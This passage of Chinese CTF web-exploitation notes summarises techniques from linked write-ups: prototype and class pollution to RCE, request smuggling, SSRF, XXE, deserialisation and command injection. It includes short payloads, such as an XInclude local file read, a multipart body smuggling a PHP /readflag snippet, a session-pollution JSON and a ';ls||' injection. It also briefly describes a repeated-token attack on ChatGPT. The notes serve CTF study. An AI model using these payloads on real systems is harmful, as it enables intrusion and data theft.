- yaml中，NO可被看作是布尔值。yaml里还有很多奇怪的布尔值表示，参考 https://www.bram.us/2022/01/11/yaml-the-norway-problem/
419. [empty execution](https://github.com/tahdjao/writeup/blob/main/braekerctf/empty_execution_en.md)
- 不使用`/`和`..`的命令注入
- 其他做法： **empty execution**
420. [stuffy](https://github.com/tahdjao/writeup/blob/main/braekerctf/stuffy_en.md)
- python `http.request`请求走私（request smuggling）。重点在于不要让用户控制`http.request`的header名和内容以及请求内容
421. [Node Calculator](https://www.yuque.com/misery333/sz1apr/uql4i9gbouggz75d#gYuTS)
- java JAXB(java to xml)反序列化漏洞。若某一个类使用了`@XmlAccessorType(XmlAccessType.PROPERTY)`，则若序列化后的XML里存在`<constructor></constructor>`标签，setConstructor就会被调用
422. [BAD NOTES](https://github.com/bengsky13/CTF-WriteUp/tree/main/bi0s/bad_notes)
- python flask的`render_template`函数在执行后会保存文件的内容。这个函数加载某个template文件后会将其保存至cache，今后调用就返回cache里的内容。即使用什么别的方法修改了template文件的内容，也不会影响cache里的内容
423. [required notes](https://siunam321.github.io/ctf/bi0sCTF-2024/Web-Exploitation/required-notes/)
- [protobuf.js](https://github.com/protobufjs/protobuf.js) Prototype Pollution CVE： https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665 。要求攻击者可控制`.proto` schema文件的属性（或注入自己的属性。`.schema`文件在用户输入未被过滤的情况下，直接拼接也会发生注入，即Protobuf Schema Injection）
- js的`glob.sync()`函数允许用Bash shell的语法查找文件
- 可利用原型链污染，污染`req.connection`的`_peername.address`属性，从而影响到`req.connection.remoteAddress`。寻找原型链污染gadget的工具：[pp-finder](https://github.com/yeswehack/pp-finder)
- 其他wp： 
    - https://hackmd.io/@r2dev2/Hkj7IhP3T
    - 参考 https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md#pp2rce-vuln-child_process-functions ，可用原型链污染污染Object，这样在调用具有参数的spawn时就会获得rce。puppeteer内部使用了带有参数的spawn。需要污染一系列属性，如果是用protobuf.js的漏洞污染的话，只能一个一个属性去污染。也可以污染ejs的escapeFunction，参考 https://github.com/mde/ejs/issues/735
    - https://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2 ：更多原型链污染到RCE payload
    - 破解math.random函数，参考另一个题目的wp： https://jsur.in/posts/2020-11-30-hitcon-ctf-2020-100-pins-writeup
424. [Is It Okay](https://blog.bi0s.in/2024/02/26/Misc/IsItOkay-bi0sCTF2024/)
- python 3.11.3 urllib漏洞：在要访问的url前加个空格可以绕过过滤
- 如果某个网站是docker container，访问`/registry`路径可以获取源码（包括其他repo的）以及其他敏感内容。详情见[docker registry API](https://distribution.github.io/distribution/spec/api/)
- js `network.gateway_ip_for` 命令注入漏洞利用
- 若python flask里有`app.config['TEMPLATES_AUTO_RELOAD'] = True`，修改template文件后无需关闭app，程序会自动重新加载修改后的template文件
- 使用lsblk判断Cross Mount。设备A可以mount设备B的文件系统，在设备A上修改文件系统会影响到设备B
425. [MLWeb](https://jorianwoltjer.com/blog/p/ctf/gcc-ctf/mlweb)
- python `hummingbird.ml`库的load函数内部读取`model_type.txt`的内容。若为"pytorch"，内部又会使用`pickle.load`。因此不能用load函数加载任意zip文件，有pickle反序列化漏洞
- js fetch的参数可以用相对路径，例如`a/../b`。因此fetch的参数不应直接拼接用户可控制内容
426. [frenzy flask](https://jorianwoltjer.com/blog/p/ctf/gcc-ctf/frenzy-flask)
- python pathlib的Path.joinpath的参数为绝对路径时，会舍弃掉前面的路径。和os.path.join的特性一致
- 若运行pip install时添加了`--user`标志，表示安装的库文件会被放置在当前用户的家目录中
- 使用`flask.__file__`可查看储存Flask的文件和其路径。可通过覆盖这个文件（如添加os.system）获取RCE，前提是重启flask服务，或有`debug=True`选项，使其在任何文件有改动的情况下自动重启
427. [Free Chat](https://github.com/elweth-sec/Writeups/blob/master/GCC-2023/Free_Chat.md)
- linux的locate命令的作用和find差不多，但是前者比后者快很多。因为find是实打实地在整个文件系统搜索指定的文件，而locate则是提前保存一个记录整个文件系统里所有文件的database，并实时更新。如果有任意文件读取漏洞，可尝试读取`/var/cache/locate/locatedb`，并用`/usr/bin/locate.findutils`查找想要的文件
- 根据 https://rgxdb.com/r/2MQXJD5 ，一个有效的URL应以`/`结尾。如果应用检查domain name必须要以某个URL开头但末尾没有`/`时，可利用HTTP authentication机制重定向至任意网址。`https://a.com@b.com`可重定向至`b.com`，也可以借此实现SSRF访问内部网站：`http://a.com@devpanel:8000/?token=token`，携带GET参数token访问内部8000端口的devpanel
428. [Free Cider](https://sanlokii.eu/writeups/gcc-ctf/free-cider/)
- swagger API platform在`/static/`（比如`/static/swagger.json`）下有api列表
- 和重置密码相关的漏洞： https://book.hacktricks.xyz/pentesting-web/reset-password 。一般重置密码后会重定向，而某些错误的重定向实现导致攻击者可以重定向至任意网站，进而窃取重置密码的token。例如重定向时直接将目标路径拼接到Host header后，攻击者就能通过修改host header重定向至任意网站
429. [Bottle Poem](https://notateamserver.xyz/blog/sekaictf-writeups)
- python bottle网站框架的cookie处理逻辑中存在pickle反序列化漏洞
430. [Notes V1](https://teamshakti.in/CTF-Write-ups/ShaktiCTF24/web/notes_v1/)
- python中的`yaml.load`存在反序列化漏洞
- 在python flask（Werkzeug）中，下划线(`_`)会被看作`-`。意味着`Content_Length` header会被看作`Content-Length`。如果发两个header `Content-Length`和`Content_Length`，go-proxy只会考虑第一个`Content-Length`，而python flask会考虑第二个`Content_Length`（第一个header的值被第二个覆盖了）。借这种差异可以获取请求走私（request smuggling）
431. [Upload fun](https://laxiisteam.blogspot.com/2024/03/and-i-tried-my-best.html)
- windows和php下的文件名最长为约256个字符。若使用php有关文件的函数（比如move_uploaded_file）时参数的文件名超过了上限，php会给出warning。若没有`@error_reporting(1)`，会连带泄漏出问题行的代码（函数）和参数
432. [Username](https://laxiisteam.blogspot.com/2024/03/and-i-tried-my-best.html)
- XXE漏洞。大部分payload去 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection 找即可，这里补充一个没见过的：`<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" parse=\"text\" href=\"file://flag\"/>`，适用于XML entities被ban了的情况，算XInclude attacks
433. [profile-pic](https://hackmd.io/@abdinata/UNbreakable-ICTF-2024#profile-pic)
- librsvg [CVE-2023-38633](https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/)路径穿越+本地文件读取漏洞
444. [pygment](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Unbreakable-Individual-2024/pygment.md)
- pygmentize[命令注入漏洞](https://github.com/dedalozzo/pygmentize/issues/1)。个人当时做这道题的时候也搜到了这个漏洞，但发现issue里的poc没法直接用，便自己改了一下：`;ls||`。成功执行，但是忘记看网页源代码了，遂错失flag……
445. [sided-curl](https://github.com/LazyTitan33/CTF-Writeups/blob/main/Unbreakable-Individual-2024/sided-curl.md)
- 利用http authentication机制实现SSRF。相关链接： https://bugs.xdavidhu.me/google/2021/12/31/fixing-the-unfixable-story-of-a-google-cloud-ssrf/
- 简写localhost。除了`127.0.0.1:8000`,还有`0:8000`
446. [require-all-denied](https://ayusshh.medium.com/jersey-ctf-require-all-denied-web-2d49e07ab33f)
- Apache 2.4.49 path traversal（路径穿越） & RCE 漏洞: https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013
447. [sculpture](https://gerlachsnezka.xhyrom.dev/writeups/amateursctf/2024/web/sculpture/)
- 纯浏览器python实现软件：[skulpt](https://skulpt.org/)，可以执行js代码。比如可以用`jseval("Sk.global")`获取到global object
- 直接利用python的输出插入xss代码解法： https://masamuneee.github.io/posts/amateursctf-2024/#9-websculpture
448. [denied](https://gerlachsnezka.xhyrom.dev/writeups/amateursctf/2024/web/denied/)
- HEAD和GET本质相同，只是服务器不会返回message-body。Express自动将HEAD映射到`.get()`方法
449. [web-crypto](https://github.com/shashankmahajan99/ctf-writeups/tree/main/first-bloods/cr3_CTF/misc/web-crypto)
- hashcat字典+自定义rule爆破bcrypt
- 1.22之前的go语言的for（应该说for-each，遍历一个序列的元素）循环中，存储每个元素使用的变量的地址不会改变。即：
```go
for _, bi := range ba {
  res[i] = &bi //&bi的值在整个for循环里都是一样的，res[i]每个索引处存储的都是相同的地址
}
```
- 官方wp： https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/misc/web-crypto
450. [SNOWfall](https://siunam321.github.io/ctf/San-Diego-CTF-2024/Web/SNOWfall/)
- ServiceNow使用
  - Service Catalog可查看所有application
  - 可在`/sys_update_set_list.do`查看update logs
  - `/workflow_ide.do?sysparm_nostack=true&sysparm_use_polaris=false`可以图像形式查看某个application的workflow
  - server side js代码分析
  - `/sys.scripts.modern.do`的`Scripts - Background`处可执行server side js代码。可用于测试一些poc
  - 查找用户/系统id
- ServiceNow server side js原型链污染。ServiceNow内部执行server side js代码时用的是Rhino引擎。其中`__proto__`很早以前就被弃用了，原型链污染这个键不会起作用。可污染`constructor.prototype`代替
451. [utf-wait](https://github.com/acmucsd/sdctf-2024/tree/main/web/utf-wait)
- [UTF-8 Overlong Encoding](https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html)。这道题考的倒不是Overlong Encoding相关的漏洞，而是猜测flag这四个字符在服务器上对应的Overlong Encoding（见Overlong Encoding的介绍，一个字符有多种Overlong Encoding的方式）
- 这个[脚本](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#utf-wait)可能好理解一点
452. [ToppleContainer](https://ayusshh.medium.com/tjctf-topplecontainer-web-d2928599e6c6)
- jwt JWKS spoofing。说得很玄乎，其实就是网站里出现了某种漏洞，导致攻击者可以控制网站验签时使用的key
- 漏洞很好理解，一些实现上的细节见wp。个人的做法稍微有点不一样：**ToppleContainer** 。关键在于如何生成jwks.json
453. [WP Elevator](https://siunam321.github.io/ctf/NahamCon-CTF-2024/Sponsorship/WP-Elevator/)
- wordpress插件php代码分析
- 在这题也稍微了解了下wordpress的一些构造。比如：[REST API endpoint](https://developer.wordpress.org/rest-api/),[AJAX actions](https://developer.wordpress.org/plugins/javascript/ajax/)，重置密码（reset password）的过程即逻辑等
- 另一道例题：[My Shop Disaster](https://twc1rcle.com/ctf/team/ctf_writeups/nahamcon_2024/web/MyShopDisaster)
    - 看另一篇[wp](https://sec.stealthcopter.com/nahamcon-ctf-2024-my-shop-disaster/)时发现了个奇怪的事：wordpress内部的`is_admin`函数检查的是“当前request是否来自于admin页面”，而不是当前用户是不是admin。又因为wordpress要求ajax action只能从`/wp-admin/admin-ajax.php`调用，所以从ajax action调用`is_admin`一定返回true
    - 这篇[wp](https://medium.com/@rphang/wp-elevator-nahamcon-ctf-24-e55bef0b6f81)的思路比较清晰（按照做题时的步骤分析）
454. [The Davinci Code](https://twc1rcle.com/ctf/team/ctf_writeups/nahamcon_2024/web/TheDavinciCode)
- 可以用`curl -X OPTIONS url`探测某个url可用的请求方法： https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/OPTIONS
455. [The Mission](https://github.com/4n86rakam1/writeup/tree/main/NahamCon_CTF_2024/The_Mission)
- 如果获取了github api的`Authorization(Bearer)`token，就可以访问诸如`https://api.github.com/user/repos`的github api获取这个token对应用户的仓库等内容
- 另外这个系列的题目都是黑盒，也算积累例题了
456. `*`
457. [Simple calculator](https://mrno0ne.notion.site/L3AK-CTF-Writeups-8dd136a6064b45f28891e7fae5e0d451)
- php无字母引号命令执行。比赛的时候我参考了 https://xz.aliyun.com/t/11929 的payload，但是发现无法执行。后面发现原因是这道题的eval被包在函数popCalc里，如果eval不在函数里是可以正常执行的
- 用8进制绕过也可以： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#write-up-for-simplecalculator-l3akctf-2024
458. [Inspect Element](https://github.com/luxeria/ctf-writeups/blob/main/GPN%20CTF%202024/Inspect%20Element.md)
- chrome debugger任意文件读取： https://blog.pentesteracademy.com/chrome-debugger-arbitrary-file-read-1ff2c41320d1
- 无msf纯手动做法： https://cyber-man.pl/GPNCTF-2024-inspect-element-web
- 另外两个python脚本自动化做法：**inspect element**
- 参考资料： -failures-with-chromiums-remote-debugger-8a4c4d19429f#3a81 ， https://book.jorianwoltjer.com/web/chrome-remote-devtools
459. php 和 golang http lib body parser的区别
- 假如发送`x.php\x00abc`，php里会将其看成`x.php`，而golang里则不是（后缀不是`.php`）
- body中发送`filename=a.php; filename*=UTF-8''a`，go得到的是`a`, php得到的是`a.php`
- 再来一个：
```
Content-Type: multipart/form-data; BOUNDARY=go; xboundary=php;

--go
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

--php
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: text/plain

<%=`/readflag`;?>
--php--
--go--
```
460. [Chatting Service](https://siunam321.github.io/ctf/Codegate-CTF-2024-Preliminary/web/Chatting-Service/)
- python flask misconfiguration。`app.run(host='0.0.0.0',port=5000)`表示该应用被绑定到所有的网络接口（network interfaces），只要访问运行这个程序的任意一个开放的`ip:5000`就能访问这个应用。比如机器在`x.x.x.x:8080`开放了应用A，将错误配置的应用B当成A的内部应用。由于应用B的错误配置，攻击者访问`x.x.x.x:5000`就能访问这个内部应用
- 一些bash命令绕过滤： https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions#bypass-paths-and-forbidden-words ，以及localhost替代`127.0.0.1`绕`.`过滤
- 如何获取Memcache里的内容： https://chinnidiwakar.gitbook.io/githubimport/pentesting/11211-memcache 。python也有对应的memcache库：`pymemcache`
461. [Python class pollution](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution)
- 这有篇更详细的文章： https://blog.abdulrah33m.com/prototype-pollution-in-python/
- 这个技巧的一个用法是污染flask session。假如merge函数作用于像下面这样的payload就能将flask里的`session["username"]`的值污染为admin：
```py
{
  "__class__": {
    "__init__": {
      "__globals__": {
        "session": {
          "username": "admin"
        }
      }
    }
  }
}
```
- 例题：[co2v2](https://octo-kumo.me/c/ctf/2024-ductf/web/co2v2)
    - 感觉就像python原型链污染。这题是用来把一个全局变量的值改了。这么看来好像比js的更强，污染的值就算被定义过也可以覆盖。甚至连全局环境变量environ都能覆盖
    - jinja2里有个Environment，当其autoescape参数为True时xss基本不可能
    - `script-src 'self' 'https://ajax.googleapis.com;` csp绕过。通过特殊的payload可以利用`ajax.googleapis.com`获取xss。wp是一种方式， https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#angularjs-and-whitelisted-domain 是另一种方式
    - 其他做法： https://siunam321.github.io/ctf/DownUnderCTF-2024/web/co2v2/
462. [upload](https://siunam321.github.io/ctf/Akasec-CTF-2024/Web/Upload/)
- `PDF.js`库任意js代码执行： https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/ ，可用于xss
463. [Proxy For Life](https://carmar.is/write-ups/proxy-for-life.html)
- go `net/http/pprof`模块的错误配置。这个模块有个`/debug/pprof/`路径，用于查看一些调试用的文件。若生产环境没有撤下，攻击者可以在这个路径下看到敏感内容
- 这题我真的钻到死胡同了……不是很熟悉go，一直卡在无用的陷阱里。结果这题是dependencies出了问题。啥时候能养成看dependencies的习惯啊？
464. [HackerCommunity](https://blog.hamayanhamayan.com)
- ruby里有个[Multiparameter](https://www.cookieshq.co.uk/posts/multiparameter-attributes)，可以用来绕过滤。比如`admin=1`被过滤了，可以用`admin(1i)=1`或`admin()=0`绕过
- request host劫持。同428条，通过手动修改request的host字段使得服务器访问攻击者控制的host。这种漏洞到底是怎么出现的？
465. [HackerNickName](https://blog.hamayanhamayan.com)
- java jackson `@JacksonInject`字段注入。可以将key设置为空字符串来插入被标记为`@JacksonInject`的字段。见 https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
- 一个[curl globbing](https://everything.curl.dev/cmdline/globbing.html)和URL相关的绕过滤技巧。具体过滤代码见wp，总之可以用`https://{a@url1/path1,b@url2/path2}`（`http://{127.0.0.1:8090,@nicknameservice:5000/}`）使java的URL库识别hostname为`nicknameservice`而curl真正访问的url为`127.0.0.1:8090`
- 其他wp： **HackerNickName** 。这题原来还有java 反序列化（SSTI）的内容，见404条。也跟 https://vulncheck.com/blog/cve-2023-44604-activemq-in-memory 沾点边
466. [Duck Finder](https://github.com/D13David/ctf-writeups/tree/main/bcactf5/web/duckfinder)
- js ejs库3.1.6 RCE漏洞： https://eslam.io/posts/ejs-server-side-template-injection-rce/
467. [tls_spec](https://github.com/southball/ctf-writeups/tree/main/Wani-CTF-2024/web/tls_spec)
- tls相关内容。如何构造自己的client certificate，如何通过抓包分析服务器接受的是哪种certificate。作者说这题有关oid_filters extension
468. [Log Action](https://siunam321.github.io/ctf/UIUCTF-2024/Web/Log-Action/)
- nextjs（ >=13.4.0 <14.1.1）SSRF漏洞： https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps 。这些js dependencie的问题可以用`npm audit`找到。这个SSRF竟然是之前见过的那种改host（这个还要加个origin）header触发的漏洞……原来还真有实例啊
- docker默认用172.17.0.0/16 subnet。稍微爆破就能找到一些内部网站的ip
469. [pwnypass](https://github.com/icesfont/ctf-writeups/tree/main/uiuctf/2024)
- 利用有漏洞的chrome插件窃取用户密码。目标插件是一个密码管理器，此题要求窃取用户在任意已知origin上的密码。过程大概是这样的：虽然插件代码和页面代码不属于同一个js环境（即没法在控制台上执行代码覆盖插件里的函数），但两者共享同样的event和dom。由于插件利用event来写入凭证，我们就能在控制台上自行修改用户名和密码并触发事件来存储任意凭证。接着插件在显示凭证的iframe里用innerHtml来记录内容，导致有html注入。不过因为csp只能用css来泄露凭证，只要受害者的凭证和我们的payload出现在同一个页面即可。插件用tab的`pendingUrl`属性来获取当前页面的origin，而这玩意表示的其实是正在导向到的网址。于是我们可以构造一个传文件的form，目标url是要偷凭证的网址，然后发送一个很大的文件，让网页卡着。等插件取`pendingUrl`后再取消（`window.stop`）导向。这样就能在当前网址下拿到别的网址下存储的凭证了。具体还是要看wp和payload
- 至于怎么调试插件，题目作者推荐直接在chrome里加载插件然后用chrome内置的调试器。打开`chrome://extensions`然后点击inspect即可调试插件的background script
- pwnypass系列的另一篇wp： https://starlightpwn.github.io/posts/uiuctf-2024/pwnypass/ ，写得更详细
470. [pwnypass2](https://github.com/icesfont/ctf-writeups/tree/main/uiuctf/2024)
- 跟上面那题同一个插件，但是这回需要读取用户磁盘上的文件。插件内部自带了一个eval，如果可以用内部的eval执行代码的话，就拥有了插件有的权限。难点在于需要自己伪造一个token加上其对应的hash。hash部分可以用经典的sha256 hash extension攻击；但伪造token时有个问题：程序用`|`符号隔开每个指令，我们需要将第四个指令改为`execute`，可我们只能在第五个及以后指令输入内容。自己重新写token的话又没法利用hash extension伪造hash。解决办法是发现计算hash值时，参数被转成`Uint8Array`。这个结构只能存储无符号8位整数，即最高255，超过这个数的字符等同于mod 256。所以说我们把token的前几个分隔符`|`换成`chr(124+256)`后，hash结果相同（能用hash extension攻击），而且又能控制split时的第四个参数（split时没有被转换成`Uint8Array`，自然前面的就被忽略了）。最后拿到eval后查看manifest，发现可以用`chrome.tabs`打开`file://` url，进而读取flag文件。假如不知道当前目录文件名的话可以打开`file://` url后用`chrome.tabs.executeScript`来获取当前页面的html，功能相当于列出目录
- 从closed shadow dom的iframe中获取iframe src。据说可以用[performance APIS](https://developer.mozilla.org/en-US/docs/Web/API/Performance_API/Monitoring_bfcache_blocking_reasons)，NotRestoredReasons下的[src属性](https://developer.mozilla.org/en-US/docs/Web/API/NotRestoredReasons/src)也行；或者跟着wp用[window references](https://github.com/whatwg/html/issues/763)
471. [fare-evasion](https://octo-kumo.me/c/ctf/2024-uiuctf/web/fare-evasion)
- 比赛时记得见过这个考点但是不记得笔记记在哪了，于是留个痕。主要是因为php使用md5时直接用的raw md5，没有hex，导致可能hash出那种长得像sql注入payload的字符串。这时直接拼接结果就出问题了
- 工具：[hasherbasher](https://github.com/gen0cide/hasherbasher)
472. [Prisoner Processor](https://github.com/DownUnderCTF/Challenges_2024_Public/blob/main/web/prisoner-processor)
- 老生常谈的js原型链污染。merge太经典了，所以这题出问题的地方是没有过滤`{}`的键值对，导致攻击者可以让键为`__proto__`，值为其他对象，污染当前对象的属性。这题利用污染给当前对象创建了一个属性，不知道这么污染能不能影响到全局
- bun null字节路径截断。可以在`Bun.file`的路径参数里注入null字节，bun会自动丢弃null字节和其之后的全部内容。因为bun内部的语言是zig，zig和c一样拿null字节当字符串结尾（合理猜测任何有这个特性的语言都有这个bug）
- 利用`/proc/self/fd`绕过waf - 利用yaml语法构造typescript脚本。yaml处理键值直接是`key: value`，所以构造ts rce payload时建议一行直接过，剩下的内容用`/**/`注释掉 - 如果在题目源代码里诸如`start.sh`的脚本里发现有“程序crush后重启”的逻辑，可以覆盖程序的index文件为别的payload，crush程序后就能执行我们的payload了
- 其他wp：
    - https://octo-kumo.me/c/ctf/2024-ductf/web/prisoner-processor ：不同的crush方式和rce payload
    - https://jamvie.net/posts/2024/07/ductf-2024-prisoner-processor/ ：一个思路差不多但是实现方式完全不一样的wp。这位大佬选择用原型链污染覆盖tsconfig.json。这个文件可以控制typescript导入模块时具体导入的文件。可以将其指向一个别的可控制内容的js文件，然后使程序崩溃，重新加载这个文件后index.ts导入模块时就能执行代码了。崩溃方式选择的是往/proc/self/mem写入内容。另外还有个冷知识，tsconfig.json其实不是json文件，它能支持`/**/`多行注释，在一个合法的json结构后加上一堆非法json也不会崩溃
473. [hah_got_em](https://octo-kumo.me/c/ctf/2024-ductf/web/hah_got_em)
- gotenberg v8.0.3 文件读取漏洞。基本上看见题目莫名其妙用一个特定版本的软件时就说明这个版本大概率有问题。不过exp不一定搜得到，需要自己查看patch找
- 其他wp：
    - https://github.com/DownUnderCTF/Challenges_2024_Public/blob/main/web/hah-got-em
    - https://chuajianshen.github.io/2024/07/06/DownUnderCTF2024/
474. [Sniffy](https://octo-kumo.me/c/ctf/2024-ductf/web/sniffy)
- php的mime_content_type函数用于查看某个文件是什么类型。但是其内部原理只是用一个表格检查文件是否包含某些字节。所以只要在特定的位置处放上特征字节就能伪造文件的类型（估计这就是一些php木马上传的绕过方法原理）。至于到底是什么位置可以爆破或者看文件里记录的[偏移](https://sources.debian.org/src/dares/0.6.5-7/magic.mime/)
- php将其session内容存储在`/tmp/sess_xxxx`。xxxx为cookie里可以看到的`PHPSESSID`的值
    - `PHPSESSID`中无效的字符会触发warning。由于用户可以控制`PHPSESSID`，有时候可以利用这点做测信道oracle： [Date Logger](https://blog.whale-tw.com/2025/10/19/qnqsec-ctf-2025)
- 更详细的wp： https://siunam321.github.io/ctf/DownUnderCTF-2024/web/sniffy/
- 非预期解： https://github.com/4n86rakam1/writeup/tree/main/DownUnderCTF_2024 。这个非预期解比预期解还复杂，主要利用了一个php文件上传[技巧](https://blog.orange.tw/2018/10/)。假如在post data开头加上个PHP_SESSION_UPLOAD_PROGRESS，php会自动开启session，无视服务器端是否开启。session文件位于`/tmp/sess_[sessid]`，而sessid又可以在cookie里控制。唯一的问题是这样上传的cookie很快就会被自动删除，所以需要race condition。这个技巧适用于文件包含没有目标文件，需要自己创建文件和payload；以及无法以其他方式控制session的值的情况
475. [i am confusion](https://siunam321.github.io/ctf/DownUnderCTF-2024/web/i-am-confusion/)
- 可以用openssl获取服务器的ssl证书公钥
- 334条的另一种情况，这里误用的是JsonWebToken库的verify。比赛时我用rsa_sign2n工具成功提取出公钥后，发现用JsonWebToken库没法伪造jwt。后面找到这个，行了： https://gist.github.com/FrancoisCapon/7e766d06cf9372fb8b5436a37b8bf18d 。这个方法也不像wp一样需要安装burpsuite的插件
- 看了另一篇[wp](https://ouuan.moe/post/2024/07/ductf-2024)，原来是我代码写错了（chatgpt也错了）。光用jsonwebtoken库是可以的
476. [waifu](https://github.com/DownUnderCTF/Challenges_2024_Public/blob/main/web/waifu)
- chatgpt [repeated token attack](https://dropbox.tech/machine-learning/bye-bye-bye-evolution-of-repeated-token-attacks-on-chatgpt-models)。当攻击者在输入的信息里插入大量重复的token（这里的token指被分组的各个有意义的字符，详细见 https://simonwillison.net/2023/Jun/8/gpt-tokenizers/ ）时，chatgpt会出现一系列奇怪的反应，例如重复回答一句话，忽略重复token前的提问，“幻视”问题等。现在修复了，当问题里出现重复token时会报错
- 可以用`javascript://`协议绕过typescript URL hostname检查，前提是不检查协议名
- 无引号xss payload
- 在discord里看见了和[temperature](https://medium.com/@wang6good/understanding-the-impact-of-temperature-on-openai-api-an-in-depth-analysis-and-thoughts-65a988e865e1)有关的讨论。长话短说，temperature越高，gpt输出的内容越随机。对应到用gpt当waf的情况就是false positive越多
477. [Crystals](https://remoteshell.zip/imaginary/)
- 如何在ruby sinatra搭建的网站上获取hostname。只要路径里有特殊字符就行。不过discord里有大佬说这题和sinatra毫无关系，错误来源于ruby内部的HTTP request parsing。详细解析： https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/crystals/
478. [Readme2](https://remoteshell.zip/imaginary)
- js URL类的特性：
```js
new URL("//a.com","http://b.com")
//=> "http://a.com"
```
- 预期解： https://crocus-script-051.notion.site/readme2-1daa048e6c1a49e5993cad2ab6371292 。Bun有个特别的性质，会把Host header的值拼接进req.url
479. [Pwning en Logique](https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/Pwning-en-Logique/)
- [SWI-Prolog](https://www.swi-prolog.org/)环境搭建的网站
- prolog语言格式化字符串漏洞。如果攻击者可以控制[format](https://www.swi-prolog.org/pldoc/doc_for?object=format/2)函数的格式符和参数，就能执行任意函数
480. [heapnotes](https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/blob/main/Web/heapnotes)
- 说是xs leak，但好像和xss一点关系都没有。主要是利用了flask的redirect函数的目标url有长度限制，若超出了这个限制就不会返回200，而是404（和[这个情况](https://stackoverflow.com/questions/67620929/url-limit-in-flask)有点像）
- 这题还有点zlib compress oracle的成分。题目会把包含flag的username和攻击者可控制的内容一起压缩，然后把结果放到redirect的url里。利用zlib遇到相同字符压缩后长度会变短的特点，一个字符一个字符地猜flag。如果猜对了，压缩的内容变短，就能成功redirect；反之则返回404
481. [buntime](https://yun.ng/c/ctf/2024-deadsec-ctf/web/buntime)
- 在payload长度受限制的情况下在bun环境RCE
- 可以用原型链污染测试远程服务器是否在同一环境下执行payload。如果是这种情况，可以利用污染`global.xxx`来将一段rce payload拆成多部分执行，进而绕过有关长度限制的waf
- 有时候bun的函数无法使用，这时用node.js的内置函数也可以
- 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#buntime 。eval get参数，这样就能将不受限制的payload从get参数中传入。wp作者提到bun里的await函数用不了，但根据这个补充payload,似乎要在async函数里执行才行
482. [colorful-board](https://yun.ng/c/ctf/2024-deadsec-ctf/web/colorful-board)
- css injection。用css选中`<input>`标签里的内容并带出到webhook
- Mongoose id其实是编码后的时间戳（timestamp）。如果有3个id按顺序被创建，知道1和3的id后就能自己爆破2的id。见 https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb#mongo-objectid-predict 。还有个工具: https://github.com/andresriancho/mongo-objectid-predict
- 更详细的wp： https://blog.exon.kr/posts/ctf/2024/deadsec/ ， https://0x0oz.github.io/writeups/deadsec-ctf-2024
483. [retrocalc](https://yun.ng/c/ctf/2024-deadsec-ctf/web/retrocalc)
- js2py sandbox escape cve poc: https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape
- 其他payload： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#retrocalc
484. [Letter to the editor](https://platypwnies.de/writeups/2024/gpn/web/letter-to-the-editor/)
- 寻找[firepad](https://github.com/FirebaseExtended/firepad)里的xss漏洞并利用
485. [Bearburger](https://firecraftgaming.hashnode.dev/crewctf-2024-writeup-bearburger)
- java [JPQL](https://www.tutorialspoint.com/jpa/jpa_jpql.htm)注入。语法和sql很像，注入也是由拼接造成的。不过这题过滤了`"`和`;`，只能用`'`和`()`凑出时间注入
- java spring SpelExpressionParser RCE。在无法获得命令执行结果的情况下执行[Spring Expression Language](https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html)并获得rce。部分语法和java通用，关键是执行命令后怎么把结果带出来
- 官方解法: https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#bearburger
486. [Malkonkordo](https://shellunease.github.io/posts/crewctf-2024-malkonkordo)
- rust [CVE-2024-24576](https://nvd.nist.gov/vuln/detail/CVE-2024-24576)。大概是rust标准库在windows上使用Command调用批处理文件（`.bat`,`.cmd`后缀）时没有正确转义参数，导致可以命令注入。rust内部执行的命令大概是这样：`.\scripts\cmd.bat "{ARG}"`，其中`{ARG}`为攻击者可控制内容。明显攻击者可以直接用`"`跳出双引号，甚至可以在找到一个包含双引号的变量后用windows bash语法切割出双引号就能逃逸
- 另一篇wp： https://remoteshell.zip/crewctf/
487. [crator](https://ireland.re/posts/idekctf_2024)
- 看起来像pyjail，其实是条件竞争。然而真有人打pyjail那条路还拿到了RCE: https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#crator
488. [includeme](https://ireland.re/posts/idekctf_2024)
- julia语言Genie库搭建的网站下的任意文件包含利用。跟那种经典php任意文件包含题一样的配置，可以控制include函数的参数。突破点在于Genie库自带了一个`test.jl`文件，里面有两个路径：post提供了最基本的文件上传功能，get覆盖了题目`app.jl`自带的include路径。这时需要利用条件竞争，同时发送两个请求，一个请求include `app.jl`,另一个则include `test.jl`。当`app.jl`在`test.jl`后处理时，有概率会发生`test.jl`里的post路径被保留但get路径仍然是`app.jl`的情况
